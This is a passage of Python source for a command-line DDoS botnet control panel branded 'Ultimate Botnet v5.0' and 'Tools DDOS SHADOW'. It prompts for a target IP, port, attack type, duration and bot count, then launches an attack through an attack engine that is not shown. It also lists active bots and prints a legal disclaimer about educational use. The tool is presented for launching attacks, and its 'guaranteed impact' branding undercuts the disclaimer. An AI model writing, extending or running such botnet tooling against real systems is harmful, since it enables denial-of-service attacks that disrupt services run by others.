        print(f"{Fore.RED}{'!'*60}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}Target:    {target_ip}:{port}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}Type:      {attack_type}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}Duration:  {duration} seconds{Style.RESET_ALL}")
        print(f"{Fore.WHITE}Bots:      {bot_count} units{Style.RESET_ALL}")
        print(f"{Fore.RED}{'!'*60}{Style.RESET_ALL}")
        
        confirm = input(f"\n{Fore.RED}🚀 LAUNCH ATTACK? [y/N]: {Style.RESET_ALL}").strip().lower()
        if confirm != 'y':
            print(f"{Fore.YELLOW}⚠️  Attack cancelled!{Style.RESET_ALL}")
            return
        
        # Launch attack
        print(f"\n{Fore.GREEN}🎬 Starting attack sequence...{Style.RESET_ALL}")
        
        try:
            success = await self.attack_engine.launch_guaranteed_attack(
                target_ip=target_ip,
                target_port=port,
                attack_type=attack_type,
                duration=duration,
                bot_count=bot_count
            )
            
            if not success:
                print(f"{Fore.RED}❌ Attack failed!{Style.RESET_ALL}")
                
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}⚠️  Attack interrupted by user{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}❌ Attack error: {e}{Style.RESET_ALL}")
    
    def show_bot_network(self):
        """Tampilkan jaringan bot"""
        bots = self.bot_manager.get_active_bots()
        
        print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}🤖 BOT NETWORK - {len(bots)} ACTIVE BOTS{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        
        if not bots:
            print(f"{Fore.YELLOW}No active bots{Style.RESET_ALL}")
            return
        
        # Display top 20 bots
        print(f"\n{Fore.YELLOW}ID{' ':8}IP Address{' ':15}Power{' ':4}Status{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}{'-'*50}{Style.RESET_ALL}")
        
        for i, bot in enumerate(bots[:20]):
            status = f"{Fore.GREEN}✓ ACTIVE{Style.RESET_ALL}" if bot.is_active else f"{Fore.RED}✗ INACTIVE{Style.RESET_ALL}"
            print(f"{Fore.WHITE}{bot.id:10} {bot.ip:20} {bot.attack_power:6} {status}{Style.RESET_ALL}")
        
        if len(bots) > 20:
            print(f"\n{Fore.YELLOW}... and {len(bots) - 20} more bots{Style.RESET_ALL}")
        
        # Statistics
        total_power = sum(b.attack_power for b in bots)
        avg_power = total_power / len(bots) if bots else 0
        
        print(f"\n{Fore.CYAN}📊 STATISTICS:{Style.RESET_ALL}")
        print(f"{Fore.WHITE}Total Bots:     {len(bots)}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}Total Power:    {total_power}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}Average Power:  {avg_power:.1f}{Style.RESET_ALL}")
    
    def system_info(self):
        """Informasi sistem"""
        import platform
        
        print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}⚙️  SYSTEM INFORMATION{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        
        info = {
            "OS": platform.system() + " " + platform.release(),
            "Python": platform.python_version(),
            "CPU Cores": psutil.cpu_count(),
            "CPU Usage": f"{psutil.cpu_percent()}%",
            "Memory Usage": f"{psutil.virtual_memory().percent}%",
            "Active Bots": self.bot_manager.get_bot_count(),
            "Simulator Version": "5.0",
            "Attack Engine": "READY" if self.bot_manager.get_bot_count() > 0 else "IDLE"
        }
        
        for key, value in info.items():
            print(f"{Fore.YELLOW}{key:15}: {Fore.WHITE}{value}{Style.RESET_ALL}")

# ==================== MAIN FUNCTION ====================
def display_legal_warning():
    """Tampilkan peringatan legal"""
    
    warning = f"""
    {Fore.RED}{'█'*60}{Style.RESET_ALL}
    {Fore.RED}██                       Tools DDOS SHADOW                   ██{Style.RESET_ALL}
    {Fore.RED}██                                                          ██{Style.RESET_ALL}
    {Fore.RED}██  THIS SOFTWARE IS FOR EDUCATIONAL PURPOSES ONLY!         ██{Style.RESET_ALL}
    {Fore.RED}██                                                          ██{Style.RESET_ALL}
    {Fore.RED}██  ✅ ALLOWED:                                            ██{Style.RESET_ALL}
    {Fore.RED}██     • Testing your own systems                           ██{Style.RESET_ALL}
    {Fore.RED}██                                                          ██{Style.RESET_ALL}
    {Fore.RED}██                                                          ██{Style.RESET_ALL}
    {Fore.RED}██                                                          ██{Style.RESET_ALL}
    {Fore.RED}██  ❌ PROHIBITED:                                         ██{Style.RESET_ALL}
    {Fore.RED}██     • Attacking systems without permission              ██{Style.RESET_ALL}
    {Fore.RED}██     • Illegal activities                                ██{Style.RESET_ALL}
    {Fore.RED}██     • Disrupting services                               ██{Style.RESET_ALL}
    {Fore.RED}██                                                         ██{Style.RESET_ALL}
    {Fore.RED}██  ⚖️  YOU ARE SOLELY RESPONSIBLE FOR YOUR ACTIONS!       ██{Style.RESET_ALL}
    {Fore.RED}{'█'*60}{Style.RESET_ALL}
    """
    
    print(warning)

async def main():
    """Fungsi utama"""
    
    # Display legal warning
    display_legal_warning()
    
    # Get user confirmation
    print(f"\n{Fore.RED}{'!'*60}{Style.RESET_ALL}")
    confirm = input(f"{Fore.RED}Do you understand and accept these terms? [y/N]: {Style.RESET_ALL}").strip().lower()
    
    if confirm != 'y':
        print(f"\n{Fore.YELLOW}❌ Access denied. Program terminated.{Style.RESET_ALL}")
        return
    
    # Check dependencies
    try:
        import aiohttp # type: ignore
        import psutil # type: ignore
    except ImportError:
        print(f"\n{Fore.RED}❌ Missing dependencies!{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Run: pip install aiohttp psutil colorama numpy{Style.RESET_ALL}")
        return
    
    # Start control panel
    print(f"\n{Fore.GREEN}✅ Starting Ultimate Botnet  v5.0...{Style.RESET_ALL}")
    print(f"{Fore.GREEN}🔥 GUARANTEED IMPACT EDITION{Style.RESET_ALL}\n")
    
    panel = UltimateControlPanel()
    await panel.main_menu()
    
    print(f"\n{Fore.GREEN}🎉 Thank you for using Ultimate Botnet !{Style.RESET_ALL}")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}👋 Program terminated by user{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}❌ Fatal error: {e}{Style.RESET_ALL}")
        import traceback
        traceback.print_exc()